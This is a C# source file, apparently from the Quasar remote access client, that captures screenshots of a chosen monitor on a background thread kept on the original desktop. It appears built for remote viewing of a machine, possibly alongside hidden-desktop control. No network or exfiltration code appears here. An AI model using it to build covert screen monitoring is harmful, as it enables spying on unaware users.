using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using Quasar.Client.Config;

namespace Quasar.Client.Helper
{
    public static class ScreenHelperCPU
    {
        private const int SRCCOPY = 0x00CC0020;
        private const int CURSOR_SHOWING = 0x00000001;

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CURSORINFO
        {
            public int cbSize;
            public int flags;
            public IntPtr hCursor;
            public POINT ScreenPosition;
        }

        // Existing imports
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern bool DeleteDC(IntPtr hdc);

        // Desktop management imports
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        private static Thread _captureThread;
        private static readonly object _captureLock = new object();
        private static volatile Bitmap _capturedBitmap;
        private static volatile bool _captureRequested;
        private static volatile int _captureDisplayIndex;
        private static readonly ManualResetEvent _captureCompletedEvent = new ManualResetEvent(false);
        private static readonly ManualResetEvent _captureRequestEvent = new ManualResetEvent(false);
        private static bool _captureThreadInitialized = false;

        public static void InitializeCaptureThread()
        {
            if (_captureThreadInitialized)
                return;

            lock (_captureLock)
            {
                if (_captureThreadInitialized)
                    return;

                _captureThread = new Thread(CaptureThreadProc)
                {
                    IsBackground = true,
                    Name = "ScreenCaptureThread"
                };
                _captureThread.Start();
                _captureThreadInitialized = true;
            }
        }

        private static void CaptureThreadProc()
        {
            Debug.WriteLine("Capture thread started");

            // Set this thread to the original desktop and keep it there
            bool success = SetThreadDesktop(Settings.OriginalDesktopPointer);
            if (!success)
            {
                Debug.WriteLine($"Failed to set capture thread to original desktop: {Marshal.GetLastWin32Error()}");
                return;
            }

            Debug.WriteLine("Capture thread set to original desktop");

            while (true)
            {
                try
                {
                    _captureRequestEvent.WaitOne();

                    if (_captureRequested)
                    {
                        _capturedBitmap = CaptureScreenInternal(_captureDisplayIndex);
                        _captureRequested = false;

                        _captureCompletedEvent.Set();
                        _captureRequestEvent.Reset();
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error in capture thread: {ex.Message}");
                    _capturedBitmap = null;
                    _captureRequested = false;
                    _captureCompletedEvent.Set();
                    _captureRequestEvent.Reset();
                }
            }
        }
        private static Bitmap CaptureScreenInternal(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = null;

            try
            {
                screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);
                using (Graphics g = Graphics.FromImage(screen))
                {
                    IntPtr destDeviceContext = g.GetHdc();
                    IntPtr srcDeviceContext = CreateDC("DISPLAY", null, null, IntPtr.Zero);

                    if (srcDeviceContext == IntPtr.Zero)
                    {
                        Debug.WriteLine("Failed to create device context for DISPLAY");
                        g.ReleaseHdc(destDeviceContext);
                        return null;
                    }

                    bool success = BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height,
                                         srcDeviceContext, bounds.X, bounds.Y, SRCCOPY);

                    if (!success)
                    {
                        Debug.WriteLine($"BitBlt failed: {Marshal.GetLastWin32Error()}");
                    }

                    var cursorInfo = new CURSORINFO { cbSize = Marshal.SizeOf(typeof(CURSORINFO)) };
                    if (GetCursorInfo(out cursorInfo) && cursorInfo.flags == CURSOR_SHOWING)
                    {
                        DrawIcon(destDeviceContext, cursorInfo.ScreenPosition.X - bounds.X,
                                 cursorInfo.ScreenPosition.Y - bounds.Y, cursorInfo.hCursor);
                    }

                    DeleteDC(srcDeviceContext);
                    g.ReleaseHdc(destDeviceContext);
                }

                return screen;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Screen capture error: {ex.Message}");
                screen?.Dispose();
                return null;
            }
        }

        public static Bitmap CaptureScreen(int screenNumber)
        {
            if (!_captureThreadInitialized)
                InitializeCaptureThread();

            _captureDisplayIndex = screenNumber;
            _captureRequested = true;
            _captureCompletedEvent.Reset();

            _captureRequestEvent.Set();

            if (!_captureCompletedEvent.WaitOne(1000))
            {
                Debug.WriteLine("Capture timeout");
                return null;
            }

            return _capturedBitmap;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            try
            {
                if (screenNumber < Screen.AllScreens.Length)
                    return Screen.AllScreens[screenNumber].Bounds;
                else
                    return Screen.PrimaryScreen.Bounds;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error getting screen bounds: {ex.Message}");
                return Screen.PrimaryScreen.Bounds;
            }
        }
    }

    public class DisplayManager
    {
        [DllImport("user32.dll")]
        public static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        public delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref Rect lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        public struct Rect
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        public static int GetDisplayCount()
        {
            int count = 0;
            EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero,
                (IntPtr hMonitor, IntPtr hdcMonitor, ref Rect lprcMonitor, IntPtr dwData) =>
                {
                    count++;
                    return true;
                }, IntPtr.Zero);
            return count;
        }
    }
}